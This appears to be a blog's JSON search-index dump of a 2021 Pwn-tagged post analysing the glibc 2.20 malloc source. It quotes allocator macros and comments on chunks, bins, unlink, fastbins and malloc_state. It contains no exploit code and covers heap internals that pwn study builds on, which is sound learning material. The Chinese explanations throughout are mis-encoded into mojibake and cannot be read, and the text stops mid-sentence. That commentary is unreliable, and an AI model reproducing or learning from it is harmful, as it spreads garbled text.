IS_MMAPPED is intentionally not masked off from size field in macros for which mmapped chunks should never be seen. This should cause helpful core dumps to occur if it is tried by accident by people extending or adapting this malloc. */#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)/* Get size, ignoring use bits */#define chunksize(p) ((p)-\u003esize \u0026 ~(SIZE_BITS))/* Ptr to next physical malloc_chunk. */#define next_chunk(p) ((mchunkptr) (((char *) (p)) + ((p)-\u003esize \u0026 ~SIZE_BITS)))/* Ptr to previous physical malloc_chunk */#define prev_chunk(p) ((mchunkptr) (((char *) (p)) - ((p)-\u003eprev_size)))/* Treat space at ptr + offset as a chunk */#define chunk_at_offset(p, s) ((mchunkptr) (((char *) (p)) + (s))) å¦‚æœå‰ä¸€ä¸ªé‚»æ¥chunkå—ç©ºé—²ï¼Œé‚£ä¹ˆå½“å‰chunkå—ç»“æ„ä½“å†…çš„prev_sizeå­—æ®µè®°å½•çš„æ˜¯å‰ä¸€ä¸ªé‚»æ¥chunkå—çš„å¤§å°ã€‚è¿™å°±æ˜¯ç”±å½“å‰chunkæŒ‡é’ˆè·å¾—å‰ä¸€ä¸ªç©ºé—²chunkåœ°å€çš„ä¾æ®ã€‚ å¦‚æœå‰ä¸€ä¸ªé‚»æ¥chunkåœ¨ä½¿ç”¨ä¸­ï¼Œåˆ™å½“å‰chunkçš„prev_sizeçš„ç©ºé—´è¢«å‰ä¸€ä¸ªchunkå€Ÿç”¨ä¸­ï¼Œå…¶ä¸­çš„å€¼æ˜¯å‰ä¸€ä¸ªchunkçš„å†…å­˜å†…å®¹ï¼Œå¯¹å½“å‰chunkæ²¡æœ‰ä»»ä½•æ„ä¹‰ã€‚ å­—æ®µsizeè®°å½•äº†æœ¬chunkçš„å¤§å°ï¼Œæ— è®ºä¸‹ä¸€ä¸ªchunkæ˜¯ç©ºé—²çŠ¶æ€æˆ–æ˜¯è¢«ä½¿ç”¨çŠ¶æ€ï¼Œéƒ½å¯ä»¥é€šè¿‡æœ¬chunkçš„åœ°å€åŠ ä¸Šæœ¬chunkçš„å¤§å°ï¼Œå¾—åˆ°ä¸‹ä¸€ä¸ªchunkçš„åœ°å€ï¼Œç”±äºsizeçš„ä½3ä¸ªbitè®°å½•äº†æ§åˆ¶ä¿¡æ¯ï¼Œéœ€è¦å±è”½æ‰è¿™äº›æ§åˆ¶ä¿¡æ¯ï¼Œå–å‡ºå®é™…çš„sizeåœ¨è¿›è¡Œè®¡ç®—ä¸‹ä¸€ä¸ªchunkåœ°å€ï¼Œè¿™æ˜¯next_chunk(p)çš„å®ç°åŸç†ã€‚prev_chunkåŒç†ã€‚ å®chunksize(p)ç”¨äºè·å¾—chunkçš„å®é™…å¤§å°ï¼Œéœ€è¦å±è”½æ‰sizeä¸­çš„æ§åˆ¶ä¿¡æ¯ã€‚ å®chunk_at_offset(p, s)å°†p+sçš„åœ°å€å¼ºåˆ¶çœ‹ä½œä¸€ä¸ªchunkã€‚ /* extract p's inuse bit */#define inuse(p) \\ ((((mchunkptr) (((char *) (p)) + ((p)-\u003esize \u0026 ~SIZE_BITS)))-\u003esize) \u0026 PREV_INUSE)/* set/clear chunk as being inuse without otherwise disturbing */#define set_inuse(p) \\ ((mchunkptr) (((char *) (p)) + ((p)-\u003esize \u0026 ~SIZE_BITS)))-\u003esize |= PREV_INUSE#define clear_inuse(p) \\ ((mchunkptr) (((char *) (p)) + ((p)-\u003esize \u0026 ~SIZE_BITS)))-\u003esize \u0026= ~(PREV_INUSE)/* check/set/clear inuse bits in known places */#define inuse_bit_at_offset(p, s) \\ (((mchunkptr) (((char *) (p)) + (s)))-\u003esize \u0026 PREV_INUSE)#define set_inuse_bit_at_offset(p, s) \\ (((mchunkptr) (((char *) (p)) + (s)))-\u003esize |= PREV_INUSE)#define clear_inuse_bit_at_offset(p, s) \\ (((mchunkptr) (((char *) (p)) + (s)))-\u003esize \u0026= ~(PREV_INUSE))/* Set size at head, without disturbing its use bit */#define set_head_size(p, s) ((p)-\u003esize = (((p)-\u003esize \u0026 SIZE_BITS) | (s)))/* Set size/use field */#define set_head(p, s) ((p)-\u003esize = (s))/* Set size at footer (only when chunk is not in use) */#define set_foot(p, s) (((mchunkptr) ((char *) (p) + (s)))-\u003eprev_size = (s)) chunkå¤´çš„æ£€æŸ¥ä¸è®¾ç½®æ“ä½œã€‚ ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:2:0","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#ç‰©ç†chunkæ“ä½œ"},{"categories":["Pwning"],"content":"å†…éƒ¨æ•°æ®ç»“æ„ /* Bins An array of bin headers for free chunks. Each bin is doubly linked. The bins are approximately proportionally (log) spaced. There are a lot of these bins (128). This may look excessive, but works very well in practice. Most bins hold sizes that are unusual as malloc request sizes, but are more usual for fragments and consolidated sets of chunks, which is what these bins hold, so they can be found quickly. All procedures maintain the invariant that no consolidated chunk physically borders another one, so each chunk in a list is known to be preceeded and followed by either inuse chunks or the ends of memory. Chunks in bins are kept in size order, with ties going to the approximately least recently used chunk. Ordering isn't needed for the small bins, which all contain the same-sized chunks, but facilitates best-fit allocation for larger chunks. These lists are just sequential. Keeping them in order almost never requires enough traversal to warrant using fancier ordered data structures. Chunks of the same size are linked with the most recently freed at the front, and allocations are taken from the back. This results in LRU (FIFO) allocation order, which tends to give each chunk an equal opportunity to be consolidated with adjacent freed chunks, resulting in larger free chunks and less fragmentation. To simplify use in double-linked lists, each bin header acts as a malloc_chunk. This avoids special-casing for headers. But to conserve space and improve locality, we allocate only the fd/bk pointers of bins, and then use repositioning tricks to treat these as the fields of a malloc_chunk*. */ å¯¹äºç©ºé—²å—çš„ç®¡ç†ptmallocä½¿ç”¨äº†binsï¼Œæ ¹æ®sizeçš„å¤§å°å°†å…¶æ”¾å…¥ä¸åŒç±»å‹çš„binä¸­ï¼Œæ¯ç§binå†…éƒ¨åˆåˆ†ä¸ºä¸åŒçš„binå¯¹ç©ºé—²å—è¿›è¡Œæ›´ç»†åŒ–çš„ç®¡ç†ã€‚æ¯ä¸ªbinéƒ½æ˜¯ç”±åŒå‘é“¾è¡¨è¿›è¡Œç»„ç»‡ç»´æŠ¤ï¼Œå¹¶ä¸”æ¯ä¸ªbinçš„å¤´éƒ¨éƒ½å……å½“ä¸€ä¸ªmalloc_chunkç»“æ„ä½“ï¼Œåœ¨binsæ•°ç»„ä¸­åªä¸ºæ¯ä¸ªbiné¢„ç•™äº†ä¸¤ä¸ªæŒ‡é’ˆçš„å†…å­˜ç©ºé—´ç”¨äºå­˜æ”¾binçš„é“¾è¡¨å¤´çš„fbå’ŒbkæŒ‡é’ˆã€‚ã€‚ é™¤äº†small binå¤–å…¶ä½™binä¸­çš„chunkéƒ½ä»¥å¤§å°é¡ºåºæ’åˆ—ã€‚ typedef struct malloc_chunk *mbinptr;/* addressing -- note that bin_at(0) does not exist */#define bin_at(m, i) \\ (mbinptr) (((char *) \u0026((m)-\u003ebins[((i) - 1) * 2])) \\ - offsetof (struct malloc_chunk, fd))/* analog of ++bin */#define next_bin(b) ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) \u003c\u003c 1)))/* Reminders about list directionality within bins */#define first(b) ((b)-\u003efd)#define last(b) ((b)-\u003ebk) bin_at(m,i)ç”¨æ¥é€šè¿‡indexæ¥è·å–binçš„é“¾è¡¨å¤´ï¼Œm æŒ‡çš„æ˜¯åˆ†é…åŒºï¼Œi æ˜¯ç´¢å¼•ã€‚ å®next_bin(b)ç”¨äºè·å¾—ä¸‹ä¸€ä¸ªbinçš„åœ°å€ï¼Œæ ¹æ®å‰é¢çš„åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“åªéœ€è¦å°†å½“å‰binçš„åœ°å€å‘åç§»åŠ¨ä¸¤ä¸ªæŒ‡é’ˆçš„é•¿åº¦å°±å¾—åˆ°ä¸‹ä¸€ä¸ªbinçš„é“¾è¡¨å¤´åœ°å€ã€‚ biné‡‡ç”¨åŒå‘é“¾è¡¨ï¼Œè¡¨å¤´çš„fdæŒ‡å‘çš„ç¬¬ä¸€ä¸ªå¯ç”¨chunkï¼ŒbkæŒ‡å‘é“¾è¡¨ä¸­æœ€åä¸€ä¸ªã€‚first(b)å’Œlast(b)ç”¨æ¥è·å–ä¸€ä¸ªbinä¸­ç¬¬ä¸€å’Œæœ€åä¸€ä¸ªå¯ç”¨chunkã€‚ ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:3:0","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#å†…éƒ¨æ•°æ®ç»“æ„"},{"categories":["Pwning"],"content":"unlink /* Take a chunk off a bin list */#define unlink(P, BK, FD) { \\ FD = P-\u003efd; \\ BK = P-\u003ebk; \\ if (__builtin_expect (FD-\u003ebk != P || BK-\u003efd != P, 0)) \\ malloc_printerr (check_action, \"corrupted double-linked list\", P); \\ else { \\ FD-\u003ebk = BK; \\ BK-\u003efd = FD; \\ if (!in_smallbin_range (P-\u003esize) \\ \u0026\u0026 __builtin_expect (P-\u003efd_nextsize != NULL, 0)) { \\ assert (P-\u003efd_nextsize-\u003ebk_nextsize == P); \\ assert (P-\u003ebk_nextsize-\u003efd_nextsize == P); \\ if (FD-\u003efd_nextsize == NULL) { \\ if (P-\u003efd_nextsize == P) \\ FD-\u003efd_nextsize = FD-\u003ebk_nextsize = FD; \\ else { \\ FD-\u003efd_nextsize = P-\u003efd_nextsize; \\ FD-\u003ebk_nextsize = P-\u003ebk_nextsize; \\ P-\u003efd_nextsize-\u003ebk_nextsize = FD; \\ P-\u003ebk_nextsize-\u003efd_nextsize = FD; \\ } \\ } else { \\ P-\u003efd_nextsize-\u003ebk_nextsize = P-\u003ebk_nextsize; \\ P-\u003ebk_nextsize-\u003efd_nextsize = P-\u003efd_nextsize; \\ } \\ } \\ } \\} ç»å…¸unlinkç”¨æ¥ä»é“¾è¡¨ä¸­å–å‡ºä¸€ä¸ªchunkã€‚ æ³¨æ„ï¼šlarge binsä¸­çš„ç©ºé—²chunkå¯èƒ½å¤„äºä¸¤ä¸ªåŒå‘å¾ªç¯é“¾è¡¨ä¸­ï¼Œunlinkæ—¶éœ€è¦ä»ä¸¤ä¸ªé“¾è¡¨ä¸­éƒ½åˆ é™¤ã€‚ æ‰€ä»¥ï¼Œä»è¿™é‡Œå¯ä»¥çœ‹å‡ºåœ¨large binä¸­chunkæ˜¯ç”¨fd_nextsizeå’Œbk_nextsizeæ¥é“¾æ¥çš„ã€‚ ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:3:1","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#unlink"},{"categories":["Pwning"],"content":"large bin\u0026small bin /* Indexing Bins for sizes \u003c 512 bytes contain chunks of all the same size, spaced 8 bytes apart. Larger bins are approximately logarithmically spaced: 64 bins of size 8 32 bins of size 64 16 bins of size 512 8 bins of size 4096 4 bins of size 32768 2 bins of size 262144 1 bin of size what's left There is actually a little bit of slop in the numbers in bin_index for the sake of speed. This makes no difference elsewhere. The bins top out around 1MB because we expect to service large requests via mmap. Bin 0 does not exist. Bin 1 is the unordered list; if that would be a valid chunk size the small bins are bumped up one. */ sizeså°äº512 bytesçš„chunkå±äºsmall binçš„ç®¡ç†èŒƒå›´ï¼Œè¡¨ä¸­åˆ—å‡ºäº†binä¹‹é—´çš„å…¬å·®ï¼Œå•ä½byteã€‚bin 0ä¸å­˜åœ¨ï¼Œbin 1æ˜¯unsorted binçš„é“¾è¡¨å¤´ã€‚ #define NBINS 128#define NSMALLBINS 64#define SMALLBIN_WIDTH MALLOC_ALIGNMENT#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT \u003e 2 * SIZE_SZ)#define MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)#define in_smallbin_range(sz) \\ ((unsigned long) (sz) \u003c (unsigned long) MIN_LARGE_SIZE)#define smallbin_index(sz) \\ ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) \u003e\u003e 4) : (((unsigned) (sz)) \u003e\u003e 3))\\ + SMALLBIN_CORRECTION)#define largebin_index_32(sz) \\ (((((unsigned long) (sz)) \u003e\u003e 6) \u003c= 38) ? 56 + (((unsigned long) (sz)) \u003e\u003e 6) :\\ ((((unsigned long) (sz)) \u003e\u003e 9) \u003c= 20) ? 91 + (((unsigned long) (sz)) \u003e\u003e 9) :\\ ((((unsigned long) (sz)) \u003e\u003e 12) \u003c= 10) ? 110 + (((unsigned long) (sz)) \u003e\u003e 12) :\\ ((((unsigned long) (sz)) \u003e\u003e 15) \u003c= 4) ? 119 + (((unsigned long) (sz)) \u003e\u003e 15) :\\ ((((unsigned long) (sz)) \u003e\u003e 18) \u003c= 2) ? 124 + (((unsigned long) (sz)) \u003e\u003e 18) :\\ 126)#define largebin_index_32_big(sz) \\ (((((unsigned long) (sz)) \u003e\u003e 6) \u003c= 45) ? 49 + (((unsigned long) (sz)) \u003e\u003e 6) :\\ ((((unsigned long) (sz)) \u003e\u003e 9) \u003c= 20) ? 91 + (((unsigned long) (sz)) \u003e\u003e 9) :\\ ((((unsigned long) (sz)) \u003e\u003e 12) \u003c= 10) ? 110 + (((unsigned long) (sz)) \u003e\u003e 12) :\\ ((((unsigned long) (sz)) \u003e\u003e 15) \u003c= 4) ? 119 + (((unsigned long) (sz)) \u003e\u003e 15) :\\ ((((unsigned long) (sz)) \u003e\u003e 18) \u003c= 2) ? 124 + (((unsigned long) (sz)) \u003e\u003e 18) :\\ 126)// XXX It remains to be seen whether it is good to keep the widths of// XXX the buckets the same or whether it should be scaled by a factor// XXX of two as well.#define largebin_index_64(sz) \\ (((((unsigned long) (sz)) \u003e\u003e 6) \u003c= 48) ? 48 + (((unsigned long) (sz)) \u003e\u003e 6) :\\ ((((unsigned long) (sz)) \u003e\u003e 9) \u003c= 20) ? 91 + (((unsigned long) (sz)) \u003e\u003e 9) :\\ ((((unsigned long) (sz)) \u003e\u003e 12) \u003c= 10) ? 110 + (((unsigned long) (sz)) \u003e\u003e 12) :\\ ((((unsigned long) (sz)) \u003e\u003e 15) \u003c= 4) ? 119 + (((unsigned long) (sz)) \u003e\u003e 15) :\\ ((((unsigned long) (sz)) \u003e\u003e 18) \u003c= 2) ? 124 + (((unsigned long) (sz)) \u003e\u003e 18) :\\ 126)#define largebin_index(sz) \\ (SIZE_SZ == 8 ? largebin_index_64 (sz) \\ : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz) \\ : largebin_index_32 (sz))#define bin_index(sz) \\ ((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz)) æ‰€æœ‰çš„binå¤´å¯è§†ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œæ€»å…±æœ‰128binï¼Œä½†æ˜¯å®é™…ä¸Šå› ä¸ºbin 0å’Œbin 127ä¸å­˜åœ¨ï¼Œæ‰€ä»¥åªæœ‰126ä¸ªbinï¼Œbin 1ä¸ºunsorted binï¼Œbin 2-63ä¸ºsmall binï¼Œå…¶ä½™éƒ½æ˜¯large binã€‚æ‰€ä»¥small binä¸º62ä¸ªï¼Œlarge binä¸º63ä¸ªã€‚ ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:3:2","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#large-binsmall-bin"},{"categories":["Pwning"],"content":"unsorted bin /* Unsorted chunks All remainders from chunk splits, as well as all returned chunks, are first placed in the \"unsorted\" bin. They are then placed in regular bins after malloc gives them ONE chance to be used before binning. So, basically, the unsorted_chunks list acts as a queue, with chunks being placed on it in free (and malloc_consolidate), and taken off (to be either used or placed in bins) in malloc. The NON_MAIN_ARENA flag is never set for unsorted chunks, so it does not have to be taken into account in size comparisons. *//* The otherwise unindexable 1-bin is used to hold unsorted chunks. */#define unsorted_chunks(M) (bin_at (M, 1)) bin 1ä¸ºunsorted binçš„é“¾è¡¨å¤´ï¼Œchunkåˆ†å‰²åå‰©ä½™çš„éƒ¨åˆ†ä¼šé¦–å…ˆè¢«æ”¾å…¥unsorted binï¼Œå¹¶ä¸”ä¸æ’åºã€‚è‹¥unsorted binä¸­çš„chunkä¸èƒ½æ»¡è¶³ç”¨æˆ·çš„è¯·æ±‚ï¼Œé‚£ä¹ˆå°±ä¼šå°†å…¶ä¸­çš„chunkè¿›è¡Œåˆå¹¶ï¼Œç„¶ååˆ†é…åˆ°å„è‡ªå±äºçš„binä¸­ã€‚æ‰€ä»¥unsorted binæ‰®æ¼”ä¸€ä¸ªé˜Ÿåˆ—çš„è§’è‰²ã€‚ ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:3:3","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#unsorted-bin"},{"categories":["Pwning"],"content":"Top /* Top The top-most available chunk (i.e., the one bordering the end of available memory) is treated specially. It is never included in any bin, is used only if no other chunk is available, and is released back to the system if it is very large (see M_TRIM_THRESHOLD). Because top initially points to its own bin with initial zero size, thus forcing extension on the first malloc request, we avoid having any special code in malloc to check whether it even exists yet. But we still need to do so when getting memory from system, so we make initial_top treat the bin as a legal but unusable chunk during the interval between initialization and the first call to sysmalloc. (This is somewhat delicate, since it relies on the 2 preceding words to be zero during this interval as well.) *//* Conveniently, the unsorted bin can be used as dummy top on first call */#define initial_top(M) (unsorted_chunks (M)) top chunkæ˜¯ç‰¹æ®Šçš„ï¼Œå®ƒä¸å±äºä»»ä½•binï¼Œå½“ä»»ä½•binéƒ½æ— æ³•æ»¡è¶³è¦æ±‚æ—¶æ‰ä¼šå¯¹å…¶è¿›è¡Œæ“ä½œã€‚å½“å®ƒå¾ˆå¤§æ—¶ä¼šé‡Šæ”¾å›æ“ä½œç³»ç»Ÿã€‚æ ¹æ®æè¿°ï¼Œä¸ºäº†ä¸å†æ·»åŠ ç‰¹æ®Šçš„ä»£ç æ¥æ£€æŸ¥top chunkï¼Œæ‰€ä»¥å°†å…¶åˆå§‹åŒ–ä¸ºä¸€ä¸ªåˆæ³•çš„unsorted binã€‚ ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:3:4","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#top"},{"categories":["Pwning"],"content":"binmap /* Binmap To help compensate for the large number of bins, a one-level index structure is used for bin-by-bin searching. `binmap' is a bitvector recording whether bins are definitely empty so they can be skipped over during during traversals. The bits are NOT always cleared as soon as bins are empty, but instead only when they are noticed to be empty during traversal in malloc. *//* Conservatively use 32 bits per map word, even if on 64bit system */#define BINMAPSHIFT 5#define BITSPERMAP (1U \u003c\u003c BINMAPSHIFT)#define BINMAPSIZE (NBINS / BITSPERMAP)#define idx2block(i) ((i) \u003e\u003e BINMAPSHIFT)#define idx2bit(i) ((1U \u003c\u003c ((i) \u0026 ((1U \u003c\u003c BINMAPSHIFT) - 1))))#define mark_bin(m, i) ((m)-\u003ebinmap[idx2block (i)] |= idx2bit (i))#define unmark_bin(m, i) ((m)-\u003ebinmap[idx2block (i)] \u0026= ~(idx2bit (i)))#define get_binmap(m, i) ((m)-\u003ebinmap[idx2block (i)] \u0026 idx2bit (i)) binmapç”¨æ¥ç®€åŒ–åˆ¤æ–­ä¸€ä¸ªbinæ˜¯å¦ä¸ºç©ºï¼Œbinmapä¸­çš„bitä½æ˜¯åœ¨mallocæ—¶è¿›è¡Œè®¾ç½®çš„ã€‚ ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:3:5","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#binmap"},{"categories":["Pwning"],"content":"fast bin /* Fastbins An array of lists holding recently freed small chunks. Fastbins are not doubly linked. It is faster to single-link them, and since chunks are never removed from the middles of these lists, double linking is not necessary. Also, unlike regular bins, they are not even processed in FIFO order (they use faster LIFO) since ordering doesn't much matter in the transient contexts in which fastbins are normally used. Chunks in fastbins keep their inuse bit set, so they cannot be consolidated with other free chunks. malloc_consolidate releases all chunks in fastbins and consolidates them with other free chunks. */typedef struct malloc_chunk *mfastbinptr;#define fastbin(ar_ptr, idx) ((ar_ptr)-\u003efastbinsY[idx])/* offset 2 to use otherwise unindexable first 2 bins */#define fastbin_index(sz) \\ ((((unsigned int) (sz)) \u003e\u003e (SIZE_SZ == 8 ? 4 : 3)) - 2) fast binç”¨æ¥ä¿å­˜æœ€è¿‘freeçš„small chunkï¼Œå¯¹äºSIZE_SZä¸º4Bçš„å¹³å°ï¼Œå°äº64Bçš„chunkåˆ†é…è¯·æ±‚ï¼Œå¯¹äºSIZE_SZä¸º8Bçš„å¹³å°ï¼Œå°äº128Bçš„chunkåˆ†é…è¯·æ±‚ï¼Œä¼šé¦–å…ˆåœ¨fast binä¸­è¿›è¡Œbest fitã€‚ fast binä½¿ç”¨å•é“¾è¡¨è¿›è¡Œç»´æŠ¤ï¼Œå³ä»…ä½¿ç”¨fdåŸŸï¼Œå…¶å¯ä»¥è§†ä¸ºLIFOçš„é“¾æ ˆã€‚å¹¶ä¸”å…¶in_useä½ä¸ä¼šè¢«ç½®é›¶ï¼Œä¿è¯å…¶ä¸­çš„chunkä¸ä¼šè¢«åˆå¹¶ã€‚ /* The maximum fastbin request size we support */#define MAX_FAST_SIZE (80 * SIZE_SZ / 4)#define NFASTBINS (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)/* FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free() that triggers automatic consolidation of possibly-surrounding fastbin chunks. This is a heuristic, so the exact value should not matter too much. It is defined at half the default trim threshold as a compromise heuristic to only attempt consolidation if it is likely to lead to trimming. However, it is not dynamically tunable, since consolidation reduces fragmentation surrounding large chunks even if trimming is not used. */#define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL) æ ¹æ®SIZE_SZçš„ä¸åŒå¤§å°ï¼Œå®šä¹‰MAX_FAST_SIZEä¸º80Bæˆ–æ˜¯160Bï¼Œfast binsæ•°ç»„çš„å¤§å°NFASTBINSä¸º10ï¼Œå³fast binså…±æœ‰åä¸ªbinï¼Œå…¬å·®ä¸º8Bã€‚ FASTBIN_CONSOLIDATION_THRESHOLDä¸º64kï¼Œå½“æ¯æ¬¡é‡Šæ”¾çš„chunkä¸è¯¥chunkç›¸é‚»çš„ç©ºé—²chunkåˆå¹¶åçš„å¤§å°å¤§äº64kæ—¶ï¼Œå°±è®¤ä¸ºå†…å­˜ç¢ç‰‡å¯èƒ½æ¯”è¾ƒå¤šäº†ï¼Œå°±éœ€è¦æŠŠfast binsä¸­çš„æ‰€æœ‰chunkéƒ½è¿›è¡Œåˆå¹¶ï¼Œä»¥å‡å°‘å†…å­˜ç¢ç‰‡å¯¹ç³»ç»Ÿçš„å½±å“ã€‚ #ifndef DEFAULT_MXFAST#define DEFAULT_MXFAST (64 * SIZE_SZ / 4)#endif/* Set value of max_fast. Use impossibly small value if 0. Precondition: there are no existing fastbin chunks. Setting the value clears fastchunk bit but preserves noncontiguous bit. */#define set_max_fast(s) \\ global_max_fast = (((s) == 0) \\ ? SMALLBIN_WIDTH : ((s + SIZE_SZ) \u0026 ~MALLOC_ALIGN_MASK))#define get_max_fast() global_max_fast set_max_fast(s)ç”¨æ¥è®¾ç½®é»˜è®¤çš„fast binsä¸­æœ€å¤§çš„chunkï¼Œåœ¨freeæ—¶ï¼Œå¤§å°å°äºé»˜è®¤å€¼çš„chunkéƒ½ä¼šè¢«åŠ å…¥åˆ°fast binsä¸­ã€‚ ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:3:6","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#fast-bin"},{"categories":["Pwning"],"content":"å†…éƒ¨çŠ¶æ€è¡¨ç¤ºä¸åˆå§‹åŒ–","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:4:0","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#å†…éƒ¨çŠ¶æ€è¡¨ç¤ºä¸åˆå§‹åŒ–"},{"categories":["Pwning"],"content":"malloc_state struct malloc_state{ /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. */ struct malloc_state *next_free; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;}; ptmallocä½¿ç”¨malloc_stateæ¥ç®¡ç†åˆ†é…åŒºã€‚mutexç”¨äºä¸²è¡ŒåŒ–è®¿é—®ï¼Œå½“æœ‰å¤šä¸ªçº¿ç¨‹è®¿é—®åŒä¸€ä¸ªåˆ†é…åŒºæ—¶ï¼Œç¬¬ä¸€ä¸ªè·å¾—è¿™ä¸ªmutexçš„çº¿ç¨‹å°†ä½¿ç”¨è¯¥åˆ†é…åŒºåˆ†é…å†…å­˜ï¼Œåˆ†é…å®Œæˆåï¼Œé‡Šæ”¾è¯¥åˆ†é…åŒºçš„mutexï¼Œä»¥ä¾¿å…¶å®ƒçº¿ç¨‹ä½¿ç”¨è¯¥åˆ†é…åŒºã€‚å¯ä»¥ç†è§£ä¸ºé”ï¼Œå½“æ­£åœ¨ä½¿ç”¨çš„çº¿ç¨‹åŠ é”åï¼Œå…¶ä»–çº¿ç¨‹å°±æ— æ³•è®¿é—®ï¼Œé”è¢«é‡Šæ”¾åæ‰å¯ä»¥ã€‚ Flags(ä¹‹å‰è®°å½•åœ¨max_fastä¸­)è®°å½•äº†åˆ†é…åŒºçš„ä¸€äº›æ ‡å¿—ï¼š /* Since the lowest 2 bits in max_fast don't matter in size comparisons, they are used as flags. *//* FASTCHUNKS_BIT held in max_fast indicates that there are probably some fastbin chunks. It is set true on entering a chunk into any fastbin, and cleared only in malloc_consolidate. The truth value is inverted so that have_fastchunks will be true upon startup (since statics are zero-filled), simplifying initialization checks. */#define FASTCHUNKS_BIT (1U)#define have_fastchunks(M) (((M)-\u003eflags \u0026 FASTCHUNKS_BIT) == 0)#define clear_fastchunks(M) catomic_or (\u0026(M)-\u003eflags, FASTCHUNKS_BIT)#define set_fastchunks(M) catomic_and (\u0026(M)-\u003eflags, ~FASTCHUNKS_BIT)/* NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous regions. Otherwise, contiguity is exploited in merging together, when possible, results from consecutive MORECORE calls. The initial value comes from MORECORE_CONTIGUOUS, but is changed dynamically if mmap is ever used as an sbrk substitute. */#define NONCONTIGUOUS_BIT (2U)#define contiguous(M) (((M)-\u003eflags \u0026 NONCONTIGUOUS_BIT) == 0)#define noncontiguous(M) (((M)-\u003eflags \u0026 NONCONTIGUOUS_BIT) != 0)#define set_noncontiguous(M) ((M)-\u003eflags |= NONCONTIGUOUS_BIT)#define set_contiguous(M) ((M)-\u003eflags \u0026= ~NONCONTIGUOUS_BIT) max_fastä¸­çš„æœ€åä¸¤ä½ç”¨ä½œæ§åˆ¶ä¿¡æ¯ï¼Œbit0ç”¨æ¥è¡¨ç¤ºfast binsæ˜¯å¦ä¸ºç©ºã€‚å¦‚æœbit0ä¸º0ï¼Œè¡¨ç¤ºåˆ†é…åŒºä¸­æœ‰fast chunkï¼Œå¦‚æœä¸º1è¡¨ç¤ºæ²¡æœ‰fast chunkï¼Œåˆå§‹åŒ–å®Œæˆåçš„malloc_stateå®ä¾‹ä¸­ï¼Œflagså€¼ä¸º0ï¼Œè¡¨ç¤ºè¯¥åˆ†é…åŒºä¸­æœ‰fast chunkï¼Œä½†å®é™…ä¸Šæ²¡æœ‰ï¼Œè¯•å›¾ä»fast binsä¸­åˆ†é…chunkéƒ½ä¼šè¿”å›NULLï¼Œåœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨å‡½æ•°malloc_consolidate()å¯¹fast binsè¿›è¡Œchunkåˆå¹¶æ—¶ï¼Œå¦‚æœmax_fastå¤§äº0ï¼Œä¼šè°ƒç”¨clear_fastchunkså®ï¼Œæ 